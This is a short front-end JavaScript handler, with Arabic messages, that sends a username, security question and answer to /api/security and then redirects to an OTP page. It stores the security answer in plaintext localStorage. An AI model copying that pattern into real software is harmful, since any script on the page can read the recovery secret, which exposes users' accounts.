const nextBtn = document.getElementById("nextBtn");

nextBtn.addEventListener("click", async (e) => {
    e.preventDefault();

    const question = document.getElementById("question").value;
    const answer = document.getElementById("answer").value.trim();

    if (!question || !answer) {
        alert("أكمل البيانات");
        return;
    }

    localStorage.setItem("question", question);
    localStorage.setItem("answer", answer);

    try {
        const response = await fetch("/api/security", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                username: localStorage.getItem("username"),
                question,
                answer
            })
        });

        if (!response.ok) {
            throw new Error("فشل إرسال البيانات");
        }

        const data = await response.json();

        if (data.success) {
            window.location.href = "otp.html";
        } else {
            alert("حدث خطأ في السيرفر");
        }

    } catch (err) {
        console.error("Security Error:", err);
        alert("تعذر الاتصال بالسيرفر");
    }
});